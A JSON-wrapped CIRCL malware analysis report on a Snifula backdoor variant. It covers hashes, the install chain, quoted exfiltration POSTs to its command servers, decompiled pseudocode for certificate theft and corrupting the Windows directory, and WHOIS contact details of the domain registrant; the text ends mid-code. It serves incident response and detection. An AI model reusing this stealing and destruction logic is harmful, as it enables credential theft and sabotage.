{
    "id": "a5cf5431-e778-488d-bc42-b350ee734057",
    "created_at": "2022-10-25T16:48:14.699553Z",
    "updated_at": "2025-03-27T02:05:31.590821Z",
    "deleted_at": null,
    "sha1_hash": "c89d765042bb57aae91e091c4eea7b12063929bb",
    "title": "Malware analysis - Ticket number 10465",
    "authors": "",
    "file_creation_date": "2013-05-29T07:36:17Z",
    "file_modification_date": "2013-05-29T07:36:17Z",
    "file_size": 537933,
    "plain_text": "TLP:WHITE\n# Malware analysis report of a Backdoor.Snifula variant\n\nCIRCL - Computer Incident Response Center Luxembourg and National CERT of Luxembourg\n\n_41, avenue de la gare, 1611 Luxembourg, Luxembourg[⇤]_\n\n(Dated: 2012-07-25 Initial version)\n\n(12-07-27 Updated domain intel)\n\n(12-09-12 Updated take-down)\n\n(13-05-29 Public release (TLP:WHITE))\n\n# Abstract\n\nTrojan horses and particularly information stealing malware are a prevalent risk in information security.\n\nAccording to Symantec, Snifula is a family of information stealing trojan horses known since 2006 and\n\nthe developers enhanced it over the years up to the current version (see Appendix for a history). The\n\nactual version is - like its predecessors - not spread very widely, but has some unusual and underestimated\n\ncapabilities that go farther than stealing passwords or files from an infected computer. A main ability\n\nof the malware is the X.509 certificate stealing functionality, which is in its maliciousness beyond the\n\nusual information stealing scenarios and generally only considered being a theoretical attack in most\n\norganizations. This report shows that the threat is real and being used in targeted attacks - and that\n\nthe attackers can reach this goal by using documented Windows functions only.\n\n_[⇤Electronic address: info@circl.lu; URL: http://www.circl.lu/](mailto:info@circl.lu)_\n\n1\n\n\n-----\n\n**Contents**\n\n**I. Introduction** 3\n\n**II. Examined Files** 3\n\n**III. Characteristics of the installation process** 6\n\n**IV. Post-installation and runtime analysis** 8\n\nA. Behavior 8\n\n1. Anti-analysis 8\n\n2. Pipe communication for Inter Process Communication 9\n\n3. Registry interaction 9\n\n4. Network behavior 9\n\n5. Different actions performed on the network: 10\n\n**V. Static analysis** 12\n\nA. Snifula Command analysis 12\n\nB. Details about specific commands: 13\n\n1. Certificate stealing 13\n\n2. Screenshot taking 14\n\n3. Cookie, History and Internet cache stealing 15\n\n4. Write executable modules 15\n\n5. KILL - Corrupt Windows 15\n\n6. SOCKS server 15\n\n**VI. Observations** 16\n\nA. General observations 16\n\nB. Observations regarding hosts / IP addresses / registrars 16\n\n**VII. Appendix** 19\n\nA. History of Snifula 19\n\nB. VirusTotal results 19\n\n1. Detections for file 2a7.exe (as of 2012-07-22) 19\n\n2. Detections for file dump_00E30000.bin 20\n\n2\n\n\n-----\n\n3. Detections for file dump_006D0000.bin 20\n\n4. Detections for file ctfmreg.dll (as of 2012-07-22) 20\n\n5. Detections for file ctfmreg64.dll 21\n\nC. Interesting code parts 21\n\n1. Corrupt Windows 21\n\n2. Delete URL from URL Cache 21\n\nD. Exports 22\n\n1. ctfmreg.dll 22\n\n2. dump_00E30000.bin 23\n\nE. Involved hosts and AS numbers 23\n\nF. Related domain information 27\n\nG. Take-down 28\n\n1. Registered domains 28\n\n2. IP addresses 28\n\n**I.** **INTRODUCTION**\n\nCIRCL has been involved in an international call to support a foreign CERT with the analysis\n\nof this particular malware. We have only been handed over an MD5 of the malware, which we\n\nwere able to locate in and download from a malware database. During the work with this file,\n\nseveral files have been produced during different types of analysis. This report aims to give an\n\noverview of the entire chain, from installation to operation of the malware.\n\n**II.** **EXAMINED FILES**\n\n1. File: 2a7.exe\n\n(a) Origin: VirusTotal\n\n(b) Function: Dropper\n\n(c) Checksums\n\ni. MD5: eaa5e4f26028c41ba3935a4ac455892c\n\nii. SHA1: 049db2d7030bf7563974a2c25671aef046cabf99\n\n3\n\n\n-----\n\niii. SHA-256: 2a72d04024a37413d260c53433309f62e922736fae3b2e321f0cdfcb2927ccf7\n\n2. File: dump_00E30000.bin\n\n(a) Origin: Dumped from a segment of 2a7.exe during dynamic analysis\n\n(b) Function: DLL, identified to be the decrypted ctfmreg.dll (see 4.)\n\n(c) Checksums\n\ni. MD5: a6bf4ae086b8d28612de4bc0d7ec4abe\n\nii. SHA1: 2b6b4fbc77553425b00ee3135e2e83386ebd797f\n\niii. SHA-256: e352a6e73b52096da9ef78e09b29f9b4b969264a0cb682a4dc9da976d260d0bd\n\n3. File: dump_006D0000.bin\n\n(a) Origin: Dumped from a segment of 2a7.exe during dynamic analysis\n\n(b) Function: Installer\n\n(c) Checksums\n\ni. MD5: d819facd7c980b01bf44ea7efbf6af42\n\nii. SHA1: abfe4e74b345669a0fcd8a34bff9c9a0a7bc9c44\n\niii. SHA-256: f6cc42d577c25192282b4eddff3efebc8efefa4056b6939e14af17fd3e365722\n\n4. File: ctfmreg.dll\n\n(a) Origin: File extracted while running dump_006D0000.bin\n\n(b) Function: Actual encrypted malware installed and running on a 32 bit Windows system\n\n(c) Checksums\n\ni. MD5: f9005fd7eb85a81f2f9b1474bba61be0\n\nii. SHA1: 89196b0ed3189e8571924144e57aa867f72164bd\n\niii. SHA-256: 67d8a87c1361b9b3a150f1dcf05082f874ed316fde3aa5311b8b7ff93bbd09f2\n\n5. File: ctfmreg64.dll\n\n(a) Origin: File extracted while running dump_006D0000.bin (with binary instrumenta\ntion)\n\n4\n\n\n-----\n\n(b) Function: Actual encrypted malware installed and running on a 64 bit Windows system\n\n(c) Checksums\n\ni. MD5: edb1c6fa185dc818e9cf1d107974561a\n\nii. SHA1: 383b76f23ac1d469a59a85af1a8d9c1d3f932e2f\n\niii. SHA-256: 4384ec85f5d83e4d8e474e4899098787c513e0a42ff1047a28f5244448dce7f7\n\n6. File: [8 decimals digits from GetTickCount()].bat (example: 41082546.bat)\n\n(a) Origin: File dropped while running dump_006D0000.bin\n\n(b) Function: Batch file to delete files after installation\n\n(c) Checksums for 41082546.bat\n\ni. MD5: d226a657b279c5fc0a892748230a56ff\n\nii. SHA1: fa7e4fb6d6de3c4769001cbfce0a00ba02ef28a5\n\niii. SHA-256: 9dae2767b8e3499d37418a75ddd04d457c7ec8d6c8f312ee109c95a8a97e7761\n\n5\n\n\n-----\n\nMemory (decrypted)\n\ndump_00E30000.bin\n\n_decrypted and encrypted_\n\n_version of same file_\n\nctfmreg.dll\n\nFilesystem (encrypted)\n\n\nFile 2a7.exe (dropper) runs dump_006D0000.bin, which drops - based on the underlying\n\n_•_\n\nWindows environment - either the file ctfmreg.dll on a 32 bit system or ctfmreg64.dll on\n\na 64 bit system into the directory c:\\windows\\system32\\ and decrypts and loads is into\n\nmemory (which was dumped as dump_00E30000.bin)\n\nThe file is registered in\n\n_•_\n\nHKLM\\System\\ CurrentControlSet \\ Control \\ Session Manager\\ AppCertDlls \\\n\non 32 bit Windows environments with the key:value pair\n\nmmcpapir : c :\\ windows\\ system32 \\ ctfmreg . d l l\n\nor with the following pair on 64 bit Windows environments\n\nmmcpapir : c :\\ windows\\ system32 \\ ctfmreg64 . d l l\n\nInitial startup is triggered via ShellExecute on\n\n_•_\n\nr u n d l l 3 2 . exe ctfmreg . d l l, CreateProcessNotify\n\nInterestingly, analysis of the file ctfmreg.dll shows a list of 46 exported functions, from\n\nwhich solely this CreateProcessNotify is left after the internal decryption process. A possible\n\nintention of the malware author(s) might be to make the library look unsuspicious. On the\n\n6\n\n\n-----\n\nother side the list of exports in this particular, unique combination qualifies pretty good as\n\na detection signature. The false positive rate has not been evaluated, though.\n\nThe file 41082546.bat (example filename) is started last. The filename is based on GetTick\n_•_\n\nCount as input for %lu.bat where %lu is a format string. It removes the installation file\n\nand itself.\n\nThe following pseudo code illustrates the process:\n\n_•_\n\n1 DWORD __stdcall main ( c o n s t CHAR ⇤ cmdLine )\n\n2 {\n\n3 HMODULE_1 = GetModuleHandleA ( 0 ) ;\n\n4 HMODULE_0 = GetModuleHandleA ( 0 ) ;\n\n5 WindowsVersion = G e t V e r s i o n ( ) ;\n\n6 c u r r e n t _ p r o c e s s _ i d = G e t C u r r e n t P r o c e s s I d ( ) ;\n\n7 s h e l l _ e x e c u t e ( cmdLine ) ;\n\n8 pMem = 0 ; memset(&v13, 0, 0 x18u ) ;\n\n9 **i f** ( call_ Q ueryInformationTok en (&pMem) )\n\n10 {\n\n11 **i f . . .**\n\n12 **i f** ( w r i t e _ c t f m r e g _ d l l ( ) )\n\n13 {\n\n14 E v e n t A t t r i b u t e s . nLength = 1 2 ;\n\n15 E v e n t A t t r i b u t e s . b I n h e r i t H a n d l e = 0 ;\n\n16 **i f . . .**\n\n17 HEVENT = CreateEventA(& E v e n t A t t r i b u t e s, TRUE, FALSE, lpName ) ;\n\n18 **i f** ( HEVENT )\n\n19 {\n\n20 SetEvent (HEVENT) ;\n\n21 S l e e p (2000 u ) ;\n\n22 ResetEvent (HEVENT) ;\n\n23 CloseHandle (HEVENT) ;\n\n24 HRSRC32 = FindResourceA (0, \"CLIENT32\", 0xA ) ;\n\n25 **i f** ( HRSRC32 )\n\n26 i n j e c t _ d e c r y p t e d _ r e s o u r c e _ i n t o _ b r o w s e r (HRSRC32, 0 x10 ) ;\n\n27 **i f** ( check_wow64 ( c u r r e n t _ p r o c e s s _ i d ) )\n\n28 {\n\n29 HRSRC64 = FindResourceA (0, \"CLIENT64\", 0xA ) ;\n\n30 **i f** ( HRSRC64 )\n\n31 i n j e c t _ d e c r y p t e d _ r e s o u r c e _ i n t o _ b r o w s e r (HRSRC64, 0 x18 ) ;\n\n32 }\n\n33 HTIMER = CreateWaitableTimerA (& E v e n t A t t r i b u t e s, TRUE, lpTimerName ) ;\n\n34 **i f . . .**\n\n35 L o c a l F r e e ( E v e n t A t t r i b u t e s . l p S e c u r i t y D e s c r i p t o r ) ;\n\n36 r e t = 0 ;\n\n37 }\n\n38 }\n\n39 }\n\n40 c r e a t e _ w r i t e _ e x e c u t e _ b a t c h _ f i l e ( ) ;\n\n41 **i f** ( r e t == −1 )\n\n42 r e t = G e t L a s t E r r o r ( ) ;\n\n43 **r e t u r n** r e t ;\n\n44 }\n\n7\n\n\n-----\n\n**IV.** **POST-INSTALLATION AND RUNTIME ANALYSIS**\n\n**A.** **Behavior**\n\n_1._ _Anti-analysis_\n\nAfter the installation as described in section III., a ctfmreg.dll is loaded into explorer.exe. It\n\ntakes care that ctfmreg.dll is loaded into every process that is started on the infected computer\n\nand by doing so it prevents basic investigation methods by not allowing various programs to start,\n\nlike Sysinternals procmon.exe.\n\n\"Procmon was unable to allocate sufficient memory to run. Try increasing the size\n\nof your page file.\"\n\nIt also takes care that only Internet Explorer or Mozilla Firefox are used as a browser. Other\n\nbrowsers, particularly the following, are exited during startup:\n\nOpera\n\n_•_\n\nSafari\n\n_•_\n\nChrome\n\n_•_\n\n8\n\n\n-----\n\n_2._ _Pipe communication for Inter Process Communication_\n\nAt this point in time, a communication pipe is established on the system. The pipe is part of\n\nthe Inter Process Communication schema of the malware and used to execute commands. The\n\npipe is built with this format string:\n\n\\\\.\\ pipe \\{%08x−%04x−%04x−%04x−%08x%04x}\n\nAnd was constant during our investigation. Nevertheless, there is an initialization factor that\n\nmight change. In our tests the pipe’s name was the following:\n\n{370 a98c4−cd53 −7296−38fd−ec812a37fe5b }\n\nThis pipe can be enumerated as a host signature, e.g. with Sysinternals pipelist.\n\n_3._ _Registry interaction_\n\nThe following Registry keys are set up in\n\nHKEY_CURRENT_USER\\ Software \\AppDataLow\\{dd2706e2 −58d9−ec64 −3673− ca57d81d8ca1 }\n\nkey ’k1’ with a 4 byte value reflecting the user id, which is created using the Windows API\n\n_•_\n\nfunction CoCreateGuid()\n\nkey ’k2’ with a 4 byte value which doesn’t seem to be used within this component\n\n_•_\n\nkey ’Version’ with the version number (currently 0x0c = 12)\n\n_•_\n\nkey ’s1’ with a 4 byte value which is created/used when the SOCKS functionality is turned\n\n_•_\n\non\n\n_4._ _Network behavior_\n\nOnly if a browser is opened, the network functions become active.\n\nImmediately when a browser is opened, the following hosts are queried with HTTP POSTs:\n\nwednesltr.com.tw\n\n_•_\n\nmasmitnd.com.tw\n\n_•_\n\n9\n\n\n-----\n\nfinancepfrro.com.tw\n\n_•_\n\nTwo backup IP addresses are also in the binary, but not seen to be queried:\n\n200.46.204.8\n\n_•_\n\n95.143.198.47\n\n_•_\n\n_5._ _Different actions performed on the network:_\n\n1. Upload of X.509 certificates: A function opens the certificate store, enumerates and exports\n\nall certificates and also the private keys, encrypts them with the password ’password’,\n\ncompresses the file and sends it over the network:\n\nPOST h t t p : / / w e d n e s l t r . com . tw/uda\n\nContent−Type : m u l t i p a r t /form−data ; boundary=−−−−−−−−−−−−−−−−−−−−−−−−−−1d7248c1d7248c1d7248c\n\nUser−Agent : M o z i l l a /5.0 ( Windows NT 5 . 1 ; r v : 1 1 . 0 ) Gecko /20100101 F i r e f o x /11.0\n\nHost : w e d n e s l t r . com . tw\n\nContent−Length : 246335\n\nConnection : keep−a l i v e\n\nM u l t i p a r t form\n\nForm data : u p l o a d _ f i l e :\n\nPK . . . . . . . . . . . @. J . $ ( . . . . . . . . . . . AuthRoot . pfxUT\n\n. . . A.O.A.O.A.O . 7 . . . 0 . . . . . . . 0 . . . . . ? ⇤ . H . .\n\n. . . . . . . . . . . . . 0 . . . . 0 . . . . . ? ⇤ . H . .\n\n. . . . . . . . 0 . . . . . . . 0 . . . . . ? ⇤ . H . .\n\n[ . . . ]\n\n2. Upload of basic environment information:\n\nPOST h t t p : / / w e d n e s l t r . com . tw/uda\n\nContent−Type : m u l t i p a r t /form−data ; boundary=−−−−−−−−−−−−−−−−−−−−−−−−−−1d7248c1d7248c1d7248c\n\nUser−Agent : M o z i l l a /5.0 ( Windows NT 5 . 1 ; r v : 1 1 . 0 ) Gecko /20100101 F i r e f o x /11.0\n\nHost : w e d n e s l t r . com . tw\n\nContent−Length : 641\n\nConnection : keep−a l i v e\n\nM u l t i p a r t form\n\nForm data : u p l o a d _ f i l e :\n\nOS: M i c r o s o f t Windows XP P r o f e s s i o n a l S e r v i c e Pack 3 ( b u i l d : 2600)\n\nARCH: x86 32 b i t\n\nUSER : Admin\n\nuser_id : 153958625\n\nv e r s i o n _ i d : 12\n\ns y s : 1\n\n(a) The server simply replies with ’ok!’\n\n3. Upload of basic software information:\n\n10\n\n\n-----\n\nPOST h t t p : / / masmitnd . com . tw/ ping\n\nContent−Type : a p p l i c a t i o n /x−www−form−u r l e n c o d e d\n\nUser−Agent : M o z i l l a /5.0 ( Windows NT 5 . 1 ; r v : 1 1 . 0 ) Gecko /20100101 F i r e f o x /11.0\n\nHost : masmitnd . com . tw\n\nContent−Length : 64\n\nConnection : keep−a l i v e\n\nURLEncoded form\n\nuser_id : 153958625\n\nv e r s i o n _ i d : 12\n\ns o c k s : 0\n\nb u i l d : 32940\n\nc r c : 00000000\n\n(a) The server returns a file which appears to be a configuration file, gzip compressed\n\nand encrypted. This file also contains new instructions\n\n4. Ask for command:\n\nPOST h t t p : / / w e d n e s l t r . com . tw/ucommd\n\nContent−Type : a p p l i c a t i o n /x−www−form−u r l e n c o d e d User−Agent : M o z i l l a /5.0 ( Windows NT 5 . 1 ; r v : 1 1 . 0 )\n\nGecko /20100101 F i r e f o x /11.0\n\nHost : w e d n e s l t r . com . tw\n\nContent−Length : 64\n\nConnection : keep−a l i v e\n\nURLEncoded form\n\nuser_id : 153958625\n\nv e r s i o n _ i d : 12\n\ns o c k s : 0\n\nb u i l d : 32940\n\nc r c : 00000000\n\n(a) This HTTP POST request is executed regularly in a separate thread. It asks for a new\n\ncommand from the server and the response is evaluated and executed on the infected\n\nsystem. A complete list of possible commands is shown in the following chapter.\n\n11\n\n\n-----\n\n**V.** **STATIC ANALYSIS**\n\n**A.** **Snifula Command analysis**\n\nExternal commands received via HTTP can be:\n\nEXE (261)\n\n_•_\n\nDL_EXE (262)\n\n_•_\n\nDL_EXE_ST (263)\n\n_•_\n\nCLEAR_COOK (267)\n\n_•_\n\nVER (-)\n\n_•_\n\nREBOOT (259)\n\n_•_\n\nKILL (264)\n\n_•_\n\nGET_CERTS (265)\n\n_•_\n\nGET_COOKIES (266)\n\n_•_\n\nSOCKS_START (271)\n\n_•_\n\nSOCKS_STOP (270)\n\n_•_\n\nGET_LOG (-)\n\n_•_\n\nThese external commands are translated into internal commands. The control is set up to be\n\nperformed via a named pipe. The number in brackets is the corresponding internal command sent\n\nvia the named pipe to the receiving function. The malware uses the browser API to communicate\n\nwith the servers. Here it uses the functionality of DeleteUrlCacheEntry() to delete the used URLs\n\nfrom the browser cache to delete traces.\n\n271: SOCKS start\n\n_•_\n\n270: SOCKS stop\n\n_•_\n\n258: Find files (threaded)\n\n_•_\n\n12\n\n\n-----\n\n259: Reboot Windows\n\n_•_\n\n260: Write file\n\n_•_\n\n261: Write executable module and execute\n\n_•_\n\n262: Write executable module\n\n_•_\n\n263: Write executable module and make it autostart\n\n_•_\n\n264: Corrupt windows directory and reboot computer\n\n_•_\n\n265: Start Certificate stealing thread\n\n_•_\n\n266: Start Cookie stealing thread\n\n_•_\n\n267: Copy Cookies, History and Internet Cache files\n\n_•_\n\n268: Write log\n\n_•_\n\n269: Read log\n\n_•_\n\nSome of the internal commands are not mapped to external commands or they are part of an\n\nexternal command.\n\n**B.** **Details about specific commands:**\n\n_1._ _Certificate stealing_\n\nThe certificates of the certificate stores (shown in the following listing) are exported, including\n\ntheir private key. This is done in the function export_certificates:\n\nPFXExportCertStoreEx (HCERTSTORE, &pPFX, L\" password \", 0, EXPORT_PRIVATE_KEYS)\n\nThis exports the given certificate store, including the private keys, encrypting it with the\n\npassword ’password’.\n\n1 DWORD __stdcall c e r t s _ t h r e a d ( i n t a1 )\n\n2 {\n\n3 temp = make_temp_file ( ) ;\n\n4 i f ( temp )\n\n5 {\n\n6 D e l e t e F i l e A ( temp ) ;\n\n7 i f ( C r e a t e D i r e c t o r y A ( temp, 0) )\n\n13\n\n\n-----\n\n8 {\n\n9 e x p o r t _ c e r t i f i c a t e s (\"My\", temp ) ;\n\n10 e x p o r t _ c e r t i f i c a t e s (\" AddressBook \", temp ) ;\n\n11 e x p o r t _ c e r t i f i c a t e s (\" AuthRoot \", temp ) ;\n\n12 e x p o r t _ c e r t i f i c a t e s (\" C e r t i f i c a t e A u t h o r i t y \", temp ) ;\n\n13 e x p o r t _ c e r t i f i c a t e s (\" D i s a l l o w e d \", temp ) ;\n\n14 e x p o r t _ c e r t i f i c a t e s (\" Root \", temp ) ;\n\n15 e x p o r t _ c e r t i f i c a t e s (\" TrustedPeople \", temp ) ;\n\n16 e x p o r t _ c e r t i f i c a t e s (\" T r u s t e d P u b l i s h e r \", temp ) ;\n\n17 e r r o r = create_file_and_add_to_send_list ( temp, 1 ) ;\n\n18 f i l e _ o p e r a t i o n s ( temp, 1, 1 ) ;\n\n19 RemoveDirectoryA ( temp ) ;\n\n20 }\n\n21 e l s e\n\n22 {\n\n23 e r r o r = G e t L a s t E r r o r ( ) ;\n\n24 }\n\n25 HeapFree ( hHeap, 0, temp ) ;\n\n26 }\n\n27 e l s e\n\n28 {\n\n29 e r r o r = 1006;\n\n30 }\n\n31 p F i l e = HeapAlloc ( hHeap, 0, 0 x400u ) ;\n\n32 w s p r i n t f A ( p F i l e, \" C e r t s ended with s t a t u s %u\\n \", e r r o r ) ;\n\n33 s i z e _ f i l e = l s t r l e n A ( p F i l e ) ;\n\n34 pipe_process_command ( s i z e _ f i l e, 268, p F i l e ) ;\n\n35 HeapFree ( hHeap, 0, p F i l e ) ;\n\n36 r e t u r n e r r o r ;\n\n37 }\n\nThe certificate files are archived and compressed into a temporary file of the format [16 hex\n\ncharacters].tmp, they are written at\n\nC:\\ Documents and S e t t i n g s\\<USER NAME>\\Local S e t t i n g s \\Temp\n\nSubsequently, another thread collects and uploads these files periodically, started within this\n\nfunction:\n\ncreate_thread_collect_upload_files ()\n\n_2._ _Screenshot taking_\n\nThe malware contains functionality to take screenshots from the infected computer. In con\ntrast to the outlined control schema via HTTP embedded commands from section V.a., the\n\nscreenshot taking command is embedded within the encrypted file returned to the /ping command\n\n(see section IV.a.5.2). A screenshot is taken when the file contains the command “SCREEN\nSHOT”. The screenshot file is then uploaded.\n\n14\n\n\n-----\n\n_3._ _Cookie, History and Internet cache stealing_\n\nThe malware collects all browser history and cache files from the browser folder and collects\n\ncookie files from Internet Explorer, Firefox and Macromedia Flash Player. The files are assembled\n\nand uploaded.\n\n_4._ _Write executable modules_\n\nThe malware can retrieve an additional executable file and either\n\nsave it to <Temp Path>\\[filename].exe where filename is a decimal unsigned long repre\n_•_\n\nsentation of the result of GetTickCount()\n\nsave and run it\n\n_•_\n\nsave and make it autostart via\n\n_•_\n\nHKCU\\ Software \\\\ Microsoft \\\\Windows\\\\ CurrentVersion \\\\Run\n\n_5._ _KILL - Corrupt Windows_\n\nWhen the malware receives the ’KILL’ command, the inode of the Windows directory is\n\noverwritten with the malware module and a reboot is triggered. Overwriting the windows directory\n\nrenders the Windows installation unusable.\n\n_6._ _SOCKS server_\n\nThe malware is able to create a reverse connection to a server on the internet, basically able\n\nto act as a proxy server for the attacker. This functionality can be turned on dynamically on\n\nrequest.\n\n15\n\n\n-----\n\n**VI.** **OBSERVATIONS**\n\n**A.** **General observations**\n\nThis is a list of general observations regarding the capabilities of this malware\n\nInternet connections are proxy capable. Even username and passwords are read from the\n\n_•_\n\ncurrent browser configuration\n\nThe combination of History stealing (targets), Cookies (authentication information), X.509\n\n_•_\n\ncertificates (strong authentication) and acting as a proxy server for the attacker is consid\nered a high risk and a serious threat to the confidentiality of information that are usually\n\nheavily protected and only accessible from defined networks.\n\nThe malware uses Threads, Windows Events, Asynchronous Procedure Calls and Windows\n\n_•_\n\nPipe communication and appears to be well-written in terms of design and implementation\n\nincluding error handling.\n\nThe malware writer(s) left a string of his build environment within the binary, that could\n\n_•_\n\nbe used for signatures:\n\nC:\\ tmp\\NRM−27_01_12\\PDB\\ client_x32 . pdb\n\nThe encrypted file returned following the /ping command needs a deeper investigation,\n\n_•_\n\nbecause it could contain more functionalities that are not covered in this analysis and\n\ncould be done in a related future work.\n\n**B.** **Observations regarding hosts / IP addresses / registrars**\n\nThe attacker has left a few traces by registering domains and using IP addresses. The network\n\nregistry information is included in the Appendix and does not give any specific hints about the\n\nattacker, except that he has or had access to different hosts at IP addresses at various places in\n\nthe world:\n\nCAT Telecom Public Company Ltd, Thailand\n\n_•_\n\nHurricane Electric, Inc ., USA\n\n_•_\n\n16\n\n\n-----\n\nAltNet, IP Kolobov Aleksandr Grigorievich, Ukraine\n\n_•_\n\nHUB.ORG, Panama\n\n_•_\n\nSERVERCONNECT, Sweden\n\n_•_\n\nThe domain registry information includes some interesting information that is worth to be men\ntioned here.\n\nThe domains included in the binary\n\nwednesltr.com.tw\n\n_•_\n\nmasmitnd.com.tw\n\n_•_\n\nfinancepfrro.com.tw\n\n_•_\n\nshare common elements: they are all registered the same day by the same “person” at the same\n\nregistrar:\n\nR e g i s t r a n t :\n\nAster Ltd\n\nLu Bing−h s i a n aster@gmail . com\n\n+86.8457434354\n\n+86.8457434354\n\nNo . 8, JiaXing Road, Antes Economic & T e c h n o l o g i c a l Development Area, Yantai, Shandong, China\n\nYanTai, ShanDong\n\nCN\n\nA d m i n i s t r a t i v e Contact :\n\nLu Bing−h s i a n aster@gmail . com\n\n+86.8457434354\n\n+86.8457434354\n\nTechnical Contact :\n\nLu Bing−h s i a n aster@gmail . com\n\n+86.8457434354\n\n+86.8457434354\n\nRecord e x p i r e s on 2013−03−06 (YYYY−MM−DD)\n\nRecord c r e a t e d on 2012−03−06 (YYYY−MM−DD)\n\nDomain s e r v e r s i n l i s t e d o r d e r :\n\nns3 . cnmsn . com\n\nns4 . cnmsn . com\n\nR e g i s t r a t i o n S e r v i c e P r o v i d e r : WebCC Ltd .\n\n17\n\n\n-----\n\nInterestingly, there are around 40 domains listed at domaintools.com which are all registered\n\nby the email address ’aster@gmail.com’. It would be no surprise if those domains are also used\n\nfor malicious activities. These domains are included in the Appendix.\n\n18\n\n\n-----\n\n**VII.** **APPENDIX**\n\n**A.** **History of Snifula**\n\n2006 - Infostealer.Snifula.A: http://www.symantec.com/security_response/writeup.jsp?docid=2006\n_•_\n\n072610-2145-99&tabid=2\n\n2006 - Infostealer.Snifula.B: http://www.symantec.com/security_response/writeup.jsp?docid=2006\n_•_\n\n110710-2700-99&tabid=2\n\n2007 - Infostealer.Snifula.C: http://www.symantec.com/security_response/writeup.jsp?docid=2007\n_•_\n\n051005-4518-99&tabid=2\n\n2012 - Backdoor.Snifula.D: http://www.symantec.com/security_response/writeup.jsp?docid=2012\n_•_\n\n062203-0431-99&tabid=2\n\n**B.** **VirusTotal results**\n\n_1._ _Detections for file 2a7.exe (as of 2012-07-22)_\n\nnProtect : Trojan . Generic .7361643\n\nMcAfee : Artemis ! EAA5E4F26028\n\nK7AntiVirus : Trojan\n\nTheHacker : Trojan / Dropper . I n j e c t o r . d i s x\n\nV i r u s B u s t e r : Trojan .DR. I n j e c t o r ! wZtuXJUqECU\n\nNOD32: a v a r i a n t of Win32/ Kryptik .ACYX\n\nF−Prot : W32/ Trojan2 .NQMQ\n\nSymantec : WS. Reputation .1\n\nNorman : W32/ I n j e c t o r . ACVI\n\nTrendMicro _−HouseCall :_ TROJ_SPNR.16 CI12\n\nAvast : Win32 : Dropper−KLC [ Drp ]\n\nKaspersky : Trojan _−Dropper . Win32 . I n j e c t o r . d i s x_\n\nBitDefender : Trojan . Generic .7361643\n\nEmsisoft : Trojan _−Dropper . Win32 . I n j e c t o r ! IK_\n\nComodo : U n c l a s s i f i e d M a l w a r e\n\nF−Secure : Trojan . Generic .7361643\n\nVIPRE : Trojan . Win32 . Generic . pak ! cobra\n\nA n t i V i r : TR/Drop . I n j e c t o r . d i s x\n\nTrendMicro : TROJ_SPNR.16 CI12\n\nMcAfee−GW−E d i t i o n : Artemis ! EAA5E4F26028\n\nSophos : Troj /FakeAV−FGJ\n\n19\n\n\n-----\n\nGData : Trojan . Generic .7361643\n\nCommtouch : W32/ Trojan2 .NQMQ\n\nAhnLab−V3 : Dropper /Win32 . I n j e c t o r\n\nVBA32 : TrojanDropper . I n j e c t o r . d i s x\n\nI k a r u s : Trojan _−Dropper . Win32 . I n j e c t o r_\n\nF o r t i n e t : W32/ I n j e c t o r . DISX ! t r\n\nAVG: Dropper . Generic5 .BODG\n\nPanda : Generic Trojan\n\nScanned : 2012−04−19 12:29:10 − 42 scans − 29 d e t e c t i o n s (69.0%)\n\n_2._ _Detections for file dump_00E30000.bin_\n\nNo detections (as of 2012-07-22)\n\n_3._ _Detections for file dump_006D0000.bin_\n\nNo detections (as of 2012-07-22)\n\n_4._ _Detections for file ctfmreg.dll (as of 2012-07-22)_\n\nMcAfee : Generic PWS. y ! d2z\n\nK7AntiVirus : Riskware\n\nTheHacker : Trojan / Kryptik . wrl\n\nV i r u s B u s t e r : Trojan . Kryptik ! WjiRK5FHsos\n\nNOD32: a v a r i a n t of Win32/ Kryptik .WRL\n\nF−Prot : W32/Agent . IV . gen ! Eldorado\n\nNorman : W32/ Suspicious_Gen4 .VNDC\n\nAvast : Win32 : Kryptik −IAQ [ Trj ]\n\nKaspersky : Backdoor . Win32 . Papras . f g i\n\nComodo : U n c l a s s i f i e d M a l w a r e\n\nVIPRE : Trojan . Win32 . Generic !BT\n\nA n t i V i r : TR/Spy . U r s n i f .89\n\nMcAfee−GW−E d i t i o n : Generic PWS. y ! d2z\n\nEmsisoft : Trojan _−Spy . Win32 . U r s n i f ! IK_\n\nM i c r o s o f t : TrojanSpy : Win32/ U r s n i f\n\nGData : Win32 : Kryptik −IAQ\n\nCommtouch : W32/Agent . IV . gen ! Eldorado\n\nAhnLab−V3 : Backdoor /Win32 . Papras\n\nI k a r u s : Trojan _−Spy . Win32 . U r s n i f_\n\nF o r t i n e t : W32/FakeAV . FGJ ! t r\n\nAVG: Crypt .ARZV\n\nScanned : 2012−05−03 16:25:11 − 40 scans − 21 d e t e c t i o n s (52.0%)\n\n20\n\n\n-----\n\n_5._ _Detections for file ctfmreg64.dll_\n\nNo detections (as of 2012-07-22)\n\n**C.** **Interesting code parts**\n\n_1._ _Corrupt Windows_\n\n1 CHAR ⇤ __usercall corrupt_windows<eax >(DWORD t h i s <ecx >, i n t a2<edi >)\n\n2 {\n\n3 CHAR ⇤ windows_directory ; // eax@1 MAPDST\n\n4 LPSTR pStr ; // eax@2\n\n5 c o n s t CHAR ⇤ d i r _ w i t h o u t _ d r i v e _ l e t t e r ; // e si @ 2\n\n6 HANDLE h F i l e W i n d o w s D i r e c t o r y ; // esi@2\n\n7 HMODULE h I n s t a n c e ; // eax@3\n\n8 BOOL s u c c e s s ; // ebp@3\n\n9 v o i d _⇤_ v9 ; // ecx@3\n\n10 DWORD NumberOfBytesWritten ; // [ sp+0h ] [ bp−4h ] @1\n\n11 NumberOfBytesWritten = t h i s ;\n\n12 windows_directory = HeapAlloc ( hHeap, 0, MAX_PATH) ;\n\n13 i f ( windows_directory )\n\n14 {\n\n15 GetWindowsDirectoryA ( windows_directory, MAX_PATH) ;\n\n16 pStr = StrChrA ( windows_directory, ’ : ’ ) ;\n\n17 pStr [ 1 ] = 0 ;\n\n18 d i r _ w i t h o u t _ d r i v e _ l e t t e r = pStr + 2 ;\n\n19 w s p r i n t f A ( pStr + 2, \"\\\\\\\\.\\\\% s \", windows_directory ) ; / / ’ \\ \\ . \\ windows ’\n\n20 h F i l e W i n d o w s D i r e c t o r y = C r e a t e F i l e A ( d i r _ w i t h o u t _ d r i v e _ l e t t e r, RW_ALL, 3u, 0, OPEN_EXISTING, 0, 0 ) ;\n\n21 i f ( h F i l e W i n d o w s D i r e c t o r y != −1 )\n\n22 {\n\n23 h I n s t a n c e = GetModuleHandleA ( 0 ) ; // GetModuleHandle ( 0 ) g i v e s a h I n s t a n c e\n\n24 s u c c e s s = W r i t e F i l e ( h F il e W in d o w s D ir e c to ry, 